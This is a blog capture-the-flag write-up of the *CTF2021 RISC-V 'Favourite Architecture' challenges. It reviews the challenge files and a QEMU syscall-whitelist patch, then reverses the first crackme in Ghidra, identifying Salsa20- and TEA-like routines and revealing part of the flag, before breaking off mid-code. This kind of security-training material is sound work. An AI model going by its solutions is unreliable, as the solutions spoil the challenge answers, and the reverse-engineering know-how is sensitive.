<!doctype html>



  



    
  

<html class="theme-next logos use-motion" lang="zh-hk">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.useso.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Hack,">








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta name="description" content="Last weekend sixstar team brought a series of RISC-V challenges in their CTF. As their name suggested, I enjoy playing RISC-V challenges very much, three flags could be found in the checkpoints:  Favo">
<meta name="keywords" content="Hack">
<meta property="og:type" content="article">
<meta property="og:title" content="[*CTF2021] Favourite Architecture Challenges">
<meta property="og:url" content="http://matshao.com/2021/01/19/CTF2021-Favourite-Architecture-Challenges/index.html">
<meta property="og:site_name" content="Mid Station">
<meta property="og:description" content="Last weekend sixstar team brought a series of RISC-V challenges in their CTF. As their name suggested, I enjoy playing RISC-V challenges very much, three flags could be found in the checkpoints:  Favo">
<meta property="og:locale" content="zh-hk">
<meta property="og:updated_time" content="2021-01-18T17:12:00.747Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="[*CTF2021] Favourite Architecture Challenges">
<meta name="twitter:description" content="Last weekend sixstar team brought a series of RISC-V challenges in their CTF. As their name suggested, I enjoy playing RISC-V challenges very much, three flags could be found in the checkpoints:  Favo">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Logos',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://matshao.com/2021/01/19/CTF2021-Favourite-Architecture-Challenges/">





  <title> [*CTF2021] Favourite Architecture Challenges | Mid Station </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">

  





<script>
  	var _mtac = {};
  	(function() {
  		var mta = document.createElement("script");
  		mta.src = "http://pingjs.qq.com/h5/stats.js?v2.0.4";
  		mta.setAttribute("name", "MTAH5");
  		mta.setAttribute("sid", "500688563");
  		var s = document.getElementsByTagName("script")[0];
  		s.parentNode.insertBefore(mta, s);
  	})();
</script>





  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="header-logos"> 
      <div class="site-meta ">
  
    <div class="site-meta-headline">
      <a href="/">
        <img class="custom-logo-image" src="/images/logo_light.png" alt="Mid Station">
      </a>
    </div>
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Mid Station</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首頁
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            歸檔
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            關於
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 
            
      </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://matshao.com/2021/01/19/CTF2021-Favourite-Architecture-Challenges/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="Matthew Shao">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Mid Station">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Mid Station" src="/images/logo_light.png">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                [*CTF2021] Favourite Architecture Challenges
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-01-19T00:51:50+08:00">
                2021-01-19
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>Last weekend sixstar team brought a series of RISC-V challenges in their CTF. As their name suggested, I enjoy playing RISC-V challenges very much, three flags could be found in the checkpoints:</p>
<ul>
<li>Favourite Architecture 0: Reverse challenge, 25 solved</li>
<li>Favourite Architecture 1: Userspace pwn challenge, read <code>/home/pwn/flag</code>.24 solved</li>
<li>Favourite Architecture 2: Qemu userspace escape pwn challenge, execute <code>/readflag2</code>. 6 solved<a id="more"></a>
</li>
</ul>
<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>The challenge designer provider a zip file that can be used to build docker image.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Archive:  c11db24e682f4d4d802f4a3ca9ca76b8.zip</span><br><span class="line">  Length      Date    Time    Name</span><br><span class="line">---------  ---------- -----   ----</span><br><span class="line">        <span class="number">0</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-16</span> <span class="number">01</span>:<span class="number">01</span>   favourite_architecture/</span><br><span class="line">      <span class="number">347</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-15</span> <span class="number">23</span>:<span class="number">02</span>   favourite_architecture/Dockerfile</span><br><span class="line">      <span class="number">125</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-16</span> <span class="number">00</span>:<span class="number">42</span>   favourite_architecture/README.md</span><br><span class="line">      <span class="number">204</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-15</span> <span class="number">22</span>:<span class="number">05</span>   favourite_architecture/build.sh</span><br><span class="line">      <span class="number">409</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-15</span> <span class="number">22</span>:<span class="number">49</span>   favourite_architecture/docker-compose.yml</span><br><span class="line">        <span class="number">6</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-16</span> <span class="number">00</span>:<span class="number">43</span>   favourite_architecture/flag2</span><br><span class="line">     <span class="number">1319</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-15</span> <span class="number">21</span>:<span class="number">33</span>   favourite_architecture/patch</span><br><span class="line">     <span class="number">8504</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-15</span> <span class="number">22</span>:<span class="number">47</span>   favourite_architecture/readflag2</span><br><span class="line">        <span class="number">0</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-15</span> <span class="number">22</span>:<span class="number">56</span>   favourite_architecture/share/</span><br><span class="line">       <span class="number">60</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-15</span> <span class="number">22</span>:<span class="number">42</span>   favourite_architecture/share/entry</span><br><span class="line">        <span class="number">6</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-16</span> <span class="number">00</span>:<span class="number">43</span>   favourite_architecture/share/flag</span><br><span class="line">   <span class="number">385912</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-15</span> <span class="number">23</span>:<span class="number">12</span>   favourite_architecture/share/main</span><br><span class="line"> <span class="number">23771760</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-15</span> <span class="number">23</span>:<span class="number">12</span>   favourite_architecture/share/qemu-riscv64</span><br><span class="line">        <span class="number">0</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-15</span> <span class="number">23</span>:<span class="number">12</span>   favourite_architecture/tmp/</span><br><span class="line">      <span class="number">631</span>  <span class="number">2021</span><span class="number">-01</span><span class="number">-15</span> <span class="number">23</span>:<span class="number">02</span>   favourite_architecture/xinetd</span><br><span class="line">---------                     -------</span><br><span class="line"> <span class="number">24169283</span>                     <span class="number">15</span> files</span><br></pre></td></tr></table></figure>
<p>Generally, there are three important files:</p>
<h3 id="main-riscv64-elf-file"><a href="#main-riscv64-elf-file" class="headerlink" title="main: riscv64 elf file"></a>main: riscv64 elf file</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./main: ELF <span class="number">64</span>-bit LSB executable, UCB RISC-V, version <span class="number">1</span> (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux <span class="number">4.15</span><span class="number">.0</span>, BuildID[sha1]=c54b93fd63fcb530ed539bd25e4322a08324b0b7, stripped</span><br><span class="line">checksec:</span><br><span class="line">		Arch:     em_riscv<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x10000</span>)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<p>The riscv64 file was compiled without any mitigations.</p>
<h3 id="qemu-riscv64-patched-qemu-userspace-emulator"><a href="#qemu-riscv64-patched-qemu-userspace-emulator" class="headerlink" title="qemu-riscv64: patched qemu userspace emulator"></a>qemu-riscv64: patched qemu userspace emulator</h3><p>The <code>qemu-riscv64</code> is 5.2 version of qemu userapce emulator but with the following patch, it added a whitelist to only allowed a subset of syscalls.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/linux-user/syscall.c b/linux-user/syscall.c</span><br><span class="line">index <span class="number">27</span>adee9.<span class="number">.2</span>d75464 <span class="number">100644</span></span><br><span class="line">--- a/linux-user/syscall.c</span><br><span class="line">+++ b/linux-user/syscall.c</span><br><span class="line">@@ <span class="number">-13101</span>,<span class="number">8</span> +<span class="number">13101</span>,<span class="number">31</span> @@ <span class="function">abi_long <span class="title">do_syscall</span><span class="params">(<span class="keyword">void</span> *cpu_env, <span class="keyword">int</span> num, abi_long arg1,</span></span></span><br><span class="line"><span class="function"><span class="params">         print_syscall(cpu_env, num, arg1, arg2, arg3, arg4, arg5, arg6);</span></span></span><br><span class="line"><span class="function"><span class="params">     &#125;</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params">-    ret = do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span></span></span><br><span class="line"><span class="function"><span class="params">-                      arg5, arg6, arg7, arg8);</span></span></span><br><span class="line"><span class="function"><span class="params">+    <span class="keyword">switch</span> (num) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="comment">// syscall whitelist</span></span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_brk:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_uname:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_readlinkat:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_faccessat:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_openat2:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_openat:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_read:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_readv:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_write:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_writev:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_mmap:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_munmap:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_exit:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_exit_group:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">case</span> TARGET_NR_mprotect:</span></span></span><br><span class="line"><span class="function"><span class="params">+            ret = do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span></span></span><br><span class="line"><span class="function"><span class="params">+                    arg5, arg6, arg7, arg8);</span></span></span><br><span class="line"><span class="function"><span class="params">+            <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">default</span>:</span></span></span><br><span class="line"><span class="function"><span class="params">+            <span class="built_in">printf</span>(<span class="string">"[!] %d bad system call\n"</span>, num);</span></span></span><br><span class="line"><span class="function"><span class="params">+            ret = <span class="number">-1</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">+            <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">+    &#125;</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">if</span> (unlikely(qemu_loglevel_mask(LOG_STRACE))) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">         print_syscall_ret(cpu_env, num, ret, arg1, arg2,</span></span></span><br></pre></td></tr></table></figure>
<h3 id="entry-launcher-script"><a href="#entry-launcher-script" class="headerlink" title="entry: launcher script"></a>entry: launcher script</h3><p><code>entry</code> is a bash script to launch the challenge.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/null</span><br><span class="line">timeout 30 ./qemu-riscv64 main</span><br></pre></td></tr></table></figure>
<h2 id="Favourite-Architecture-0"><a href="#Favourite-Architecture-0" class="headerlink" title="Favourite Architecture 0"></a>Favourite Architecture 0</h2><p>Unfortunately, my favorite reverse engineering tool ida pro still do not have support for this “favorite architecture”, but we can turn to the powerful ghidra, which already had nice support since version 9.2 released in November 2020: <a href="https://ghidra-sre.org/releaseNotes_9.2.html" target="_blank" rel="noopener">Ghidra: Release Notes</a><br>I was too lazy to update the new version and this challenge was finished with a developing version in August 2020, the old version is enough, and I guess the new release version should have better support for RISCV.<br>With the string <code>Input the flag:</code> we can quickly locate the main function at <code>0x10400</code>, but it shows “Unknown Error” at the decompile window. Here is a little trick to work around this issue:</p>
<ol>
<li>Locate the function in which the <code>gp</code> value was set. In this case, is <code>0x101ec</code>, this function can be decompiled automatically:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FUN_000101ec</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>We can see that the <code>gp</code> value was set to <code>0x6f178</code>, and this value will remain to be the same during running.</p>
<ol start="2">
<li>Press <code>Ctrl-A</code> in the disassembly window to select all the code, and press <code>Ctrl-R</code> to invoke the <code>set register</code> window. In this window, we can set the correct gp value.</li>
<li>Go back to the main function at <code>0x10400</code>, and now it can be decompiled correctly.<br>The decompile result was pretty readable. With some guessing, we can identify the library functions and understanding the logic.</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">UndefinedFunction_00010400</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ulonglong uVar1;</span><br><span class="line">  longlong lVar2;</span><br><span class="line">  undefined auStack488 [<span class="number">192</span>];</span><br><span class="line">  undefined auStack296 [<span class="number">256</span>];</span><br><span class="line">  ulonglong uStack40;</span><br><span class="line">  longlong lStack32;</span><br><span class="line">  <span class="keyword">int</span> iStack20;</span><br><span class="line">  </span><br><span class="line">  setvbuf(PTR_DAT_0006ea28,<span class="number">0</span>);</span><br><span class="line">  setvbuf(PTR_DAT_0006ea20,<span class="number">0</span>);</span><br><span class="line">  setvbuf(PTR_DAT_0006ea18,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the flag: "</span>);</span><br><span class="line">  gets(auStack296);</span><br><span class="line">  uVar1 = <span class="built_in">strlen</span>(auStack296);</span><br><span class="line">                    <span class="comment">/* len == 0x59 */</span></span><br><span class="line">  <span class="keyword">if</span> (uVar1 == ((longlong)(iRam000000000006e9dc + iRam000000000006e9d8) &amp; <span class="number">0xffffffff</span>U)) &#123;</span><br><span class="line">                    <span class="comment">/* input+0x29 */</span></span><br><span class="line">    lStack32 = strdup(auStack296 + ((longlong)iRam000000000006e9d8 &amp; <span class="number">0xffffffff</span>));</span><br><span class="line">    FUN_0001118a(auStack488,<span class="string">"tzgkwukglbslrmfjsrwimtwyyrkejqzo"</span>,<span class="string">"oaeqjfhclrqk"</span>,<span class="number">0x80</span>);</span><br><span class="line">    FUN_000111ea(auStack488,auStack296,iRam000000000006e9d8);</span><br><span class="line">    lVar2 = <span class="built_in">strcmp</span>(auStack296,&amp;DAT_0006d000,iRam000000000006e9d8);</span><br><span class="line">    <span class="keyword">if</span> (lVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      uStack40 = <span class="built_in">strlen</span>(lStack32);</span><br><span class="line">      iStack20 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (uStack40 &gt;&gt; <span class="number">3</span> &lt;= (ulonglong)(longlong)iStack20) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"You are right :D"</span>);</span><br><span class="line">          gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        FUN_000102ae(iStack20 * <span class="number">8</span> + lStack32,&amp;DAT_0006d060);</span><br><span class="line">        lVar2 = <span class="built_in">strcmp</span>(iStack20 * <span class="number">8</span> + lStack32,(longlong)(iStack20 * <span class="number">8</span>) + <span class="number">0x6d030</span>,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (lVar2 != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        iStack20 = iStack20 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"You are wrong ._."</span>);</span><br><span class="line">  gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>So after getting the input, it first checks whether the length is <code>0x59</code>, and perform the verification in two steps:</p>
<ol>
<li>The input string will be processed with some kind of encryption with <code>0x1118a</code> and <code>0x111ea</code>, and the result will be compared with a hex string at <code>0x6e9d8</code>.</li>
<li>The last 0x30 byte of input string will be separated into 6 groups of qword, and passed to <code>0x102ae</code> with a key in <code>0x6d060</code>, then the result will be compared with hex string in <code>0x6d030</code>.<br>For the first part, we can track down <code>0x1118a</code> and find some clue in <code>0x106ce</code>:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FUN_000106ce</span><span class="params">(longlong param_1,longlong param_2,longlong param_3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  undefined4 uVar1;</span><br><span class="line">  </span><br><span class="line">  FUN_00021386(param_1 + <span class="number">0x48</span>,param_2,<span class="number">0x20</span>);</span><br><span class="line">  FUN_00021386(param_1 + <span class="number">0x68</span>,param_3,<span class="number">0xc</span>);</span><br><span class="line">  uVar1 = FUN_000105ce(<span class="string">"expand 32-byte k"</span>);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0x80</span>) = uVar1;</span><br><span class="line">  uVar1 = FUN_000105ce(<span class="string">"nd 32-byte k"</span>);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0x84</span>) = uVar1;</span><br><span class="line">  uVar1 = FUN_000105ce(<span class="string">"2-byte k"</span>);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0x88</span>) = uVar1;</span><br><span class="line">  uVar1 = FUN_000105ce(<span class="string">"te k"</span>);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0x8c</span>) = uVar1;</span><br><span class="line">  uVar1 = FUN_000105ce(param_2);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0x90</span>) = uVar1;</span><br><span class="line">  uVar1 = FUN_000105ce(param_2 + <span class="number">4</span>);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0x94</span>) = uVar1;</span><br><span class="line">  uVar1 = FUN_000105ce(param_2 + <span class="number">8</span>);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0x98</span>) = uVar1;</span><br><span class="line">  uVar1 = FUN_000105ce(param_2 + <span class="number">0xc</span>);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0x9c</span>) = uVar1;</span><br><span class="line">  uVar1 = FUN_000105ce(param_2 + <span class="number">0x10</span>);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0xa0</span>) = uVar1;</span><br><span class="line">  uVar1 = FUN_000105ce(param_2 + <span class="number">0x14</span>);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0xa4</span>) = uVar1;</span><br><span class="line">  uVar1 = FUN_000105ce(param_2 + <span class="number">0x18</span>);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0xa8</span>) = uVar1;</span><br><span class="line">  uVar1 = FUN_000105ce(param_2 + <span class="number">0x1c</span>);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0xac</span>) = uVar1;</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0xb0</span>) = <span class="number">0</span>;</span><br><span class="line">  uVar1 = FUN_000105ce(param_3);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0xb4</span>) = uVar1;</span><br><span class="line">  uVar1 = FUN_000105ce(param_3 + <span class="number">4</span>);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0xb8</span>) = uVar1;</span><br><span class="line">  uVar1 = FUN_000105ce(param_3 + <span class="number">8</span>);</span><br><span class="line">  *(undefined4 *)(param_1 + <span class="number">0xbc</span>) = uVar1;</span><br><span class="line">  FUN_00021386(param_1 + <span class="number">0x68</span>,param_3,<span class="number">0xc</span>);</span><br><span class="line">  gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>It looks like the key initialization function, and we can search the const “expand 32-byte k”, and found that it is from the Salsa20: <a href="https://en.wikipedia.org/wiki/Salsa20" target="_blank" rel="noopener">Salsa20</a><br>The encryption logic is quite similar, but some magic number seems does not match the generic algorithm. But the key point here is that Salsa20 is a symmetric algorithm, we can use the same logic to decrypt the ciphertext. So I simply send the hex string at <code>0x6d000</code>, which is 0x29 bytes long, and append with 0x30 <code>\x00</code>. Then set a breakpoint when calling <code>strcmp</code> to see the plaintext at the memory, it was <code>flag{have_you_tried_ghidra9.2_decompiler_</code><br>For the second part, it turned out <code>0x102ae</code> is a naive encryption function with 10 round:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FUN_000102ae</span><span class="params">(uint *param_1,<span class="keyword">int</span> *param_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint local_20;</span><br><span class="line">  <span class="keyword">int</span> local_1c;</span><br><span class="line">  uint local_18;</span><br><span class="line">  uint local_14;</span><br><span class="line">  </span><br><span class="line">  local_14 = *param_1;</span><br><span class="line">  local_18 = param_1[<span class="number">1</span>];</span><br><span class="line">  local_1c = <span class="number">0</span>;</span><br><span class="line">  local_20 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (local_20 &lt; <span class="number">0x10</span>) &#123;</span><br><span class="line">    local_1c = local_1c + <span class="number">-0x61c88647</span>;</span><br><span class="line">    local_14 = ((local_18 &gt;&gt; <span class="number">5</span>) + param_2[<span 